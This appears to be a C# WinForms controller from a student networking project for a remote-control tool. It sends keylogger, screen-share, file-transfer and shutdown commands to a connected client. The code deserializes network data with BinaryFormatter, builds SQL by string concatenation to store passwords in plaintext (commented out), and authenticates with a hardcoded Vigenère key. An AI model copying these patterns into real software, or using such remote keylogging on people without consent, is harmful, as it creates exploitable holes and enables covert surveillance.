using Server;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Data.SqlClient;

namespace Server
{
    public partial class ManageForm : Form
    {

        string KEY = "antn";
        string PLAIN_TEXT = "NT106.N21.ANTN NHOM 2";

        bool CheckPasswwordIsCorrect = false;
        Thread ListenThread;
        

        TcpClient client;
        TcpClient klogClient;
        TcpClient ShareScreenClient;
        TcpClient FileTransClient;

        string clientID;

        private NetworkStream CommandStream;
        private NetworkStream ShareScreenStream;

        Thread ShowThread;
        private static ManualResetEvent mre = new ManualResetEvent(false);
        bool IsSharingScreen = false;
        public ManageForm(TcpClient k, TcpClient ss, TcpClient m, TcpClient fileTransClient, string clientID)
        {
            klogClient = k;
            ShareScreenClient = ss;
            client = m;
            FileTransClient = fileTransClient;
            CommandStream = m.GetStream();
            this.clientID = clientID;

            //sendShare();

            this.CommandStream = client.GetStream();

            //send KEY;
            byte[] data = Encoding.ASCII.GetBytes(KEY);
            CommandStream.Write(data, 0, data.Length);

            ListenThread = new Thread(HandleClientComm);
            ShowThread = new Thread(ScreenShow);

            ListenThread.IsBackground = true;
            ListenThread.Start();
            InitializeComponent();
         
        }

        private void HandleClientComm()
        {
            byte[] message = new byte[4096];
            int bytesRead;
            string data;

            while (client.Connected)
            {
                bytesRead = CommandStream.Read(message, 0, message.Length);
                data = Encoding.ASCII.GetString(message, 0, bytesRead);

                if (VigenereDecrypt(data, KEY) == PLAIN_TEXT)
                {
                    CheckPasswwordIsCorrect = true;
                    SendExitCommand();
                }
                else
                {
                    CheckPasswwordIsCorrect = false;
                }
            }

            client.Close();
        }

        void SendExitCommand()
        {
            if (!CheckPasswwordIsCorrect) return;

            if (client != null && client.Connected)
            {
                byte[] data = Encoding.ASCII.GetBytes("Exit");
                CommandStream.Write(data, 0, data.Length);
            }
        }


        private void Shut_down_Click(object sender, EventArgs e)
        {
            try
            {
                CommandStream = client.GetStream();
                Form HenGio = new HenGio(CommandStream, clientID);
                HenGio.Show();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Application.Exit();
            }
        }
        /*(void LoadPass2Dtb(string ip, string port, string pass)
        {
            SqlConnection connection = new SqlConnection(@"Data Source=DESKTOP-TOI9180\NIKOTINE;Initial Catalog=Pass;Integrated Security=True");

            SqlCommand command = new SqlCommand(@"INSERT INTO [dbo].[table_1]
           ([IP]
           ,[port]
           ,[password])
        VALUES
            ('" + ip + "','" + port + "','" + pass + "')", connection
             );
            connection.Open();
            command.ExecuteNonQuery();
            connection.Close();
        } */

        void sendShare()
        {
            byte[] data = Encoding.ASCII.GetBytes("Share-Screen");
            CommandStream.Write(data, 0, data.Length);
            
        }

        private void Menu_Tab_Load(object sender, EventArgs e)
        {
            //Hiển thị toàn màn hình: 
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;
            this.Location = new Point(0, 0);
            this.Size = new Size(w, h);
        }
         
        private void Key_logger_Click(object sender, EventArgs e)
        {
            try
            {
                CommandStream = client.GetStream();
                byte[] data = Encoding.ASCII.GetBytes("Key-log");
                CommandStream.Write(data, 0, data.Length);

                Form Klg = new KeyLogger(klogClient);
                Klg.Show();
                
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                
            }
        }
        private void share_screen_Click(object sender, EventArgs e)
        {
            try
            {
                if (!IsSharingScreen)
                {
                    CommandStream = client.GetStream();
                    byte[] data = Encoding.ASCII.GetBytes("Share-Screen");
                    CommandStream.Write(data, 0, data.Length);
                    IsSharingScreen = true;

                    if (!ShowThread.IsAlive)
                    {
                        ShowThread.Start();
                    }
                    else mre.Set();

                    share_screen.Text = "STOP SHARE";
                    
                }
                else
                {
                    IsSharingScreen = false;
                    CommandStream = client.GetStream();
                    string cmd = "Stop-Share";
                    Byte[] data = Encoding.ASCII.GetBytes(cmd);
                    CommandStream.Write(data, 0, data.Length);

                    share_screen.Text = "SHARE SCREEN";
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);

            }
        }

        
        private void ScreenShow()
        {

            try
            {
                BinaryFormatter binaryFormatter = new BinaryFormatter();

                while (client.Connected && Thread.CurrentThread.IsAlive)
                {
                    if(!IsSharingScreen)
                    {
                        ScreenPicture.Image = null;
                        mre.WaitOne();
                    }
                    ShareScreenStream = ShareScreenClient.GetStream();
                    ScreenPicture.Image = (Image)binaryFormatter.Deserialize(ShareScreenStream);
                }
            }
            catch
            {
                MessageBox.Show("Client disconnected");
                EndConnect();
            }
        }

        void EndConnect()
        {
            if (client != null)
            {
                client.Close();
                client = null;
            }
            if (ShareScreenStream != null)
            {
                ShareScreenStream.Close();
                ShareScreenStream = null;
            }
            if (ShowThread != null)
            {
                ShowThread.Abort();
                ShowThread = null;
            }
            Application.Exit();
        }

        private void File_trans_Click(object sender, EventArgs e)
        {
            try
            {
                CommandStream = client.GetStream();
                byte[] data = Encoding.ASCII.GetBytes("transfer-file");
                CommandStream.Write(data, 0, data.Length);

                Form tab_file = new File_transfer_tab(FileTransClient);
                tab_file.Show();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);

            }
        }

        public static string VigenereDecrypt(string cipherText, string key)
        {
            string alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            string decryptedText = "";
            int keyIndex = 0;

            foreach (char cipherChar in cipherText)
            {
                char upperCipherChar = Char.ToUpper(cipherChar);

                if (alphabet.Contains(upperCipherChar))
                {
                    // Find the position of the character in the alphabet
                    int cipherIndex = alphabet.IndexOf(upperCipherChar);

                    // Find the position of the corresponding keyword character
                    char keyChar = Char.ToUpper(key[keyIndex % key.Length]);
                    int keyIndexInAlphabet = alphabet.IndexOf(keyChar);

                    // Decrypt the character by subtracting the position of the keyword character
                    int decryptedIndex = (cipherIndex - keyIndexInAlphabet + alphabet.Length) % alphabet.Length;
                    char decryptedChar = alphabet[decryptedIndex];

                    // If the original character was lowercase, make the decrypted character lowercase
                    if (Char.IsLower(cipherChar))
                    {
                        decryptedChar = Char.ToLower(decryptedChar);
                    }

                    decryptedText += decryptedChar;

                    // Move on to the next character of the keyword
                    keyIndex++;
                }
                else
                {
                    decryptedText += cipherChar;
                }
            }

            return decryptedText;
        }

    }
}
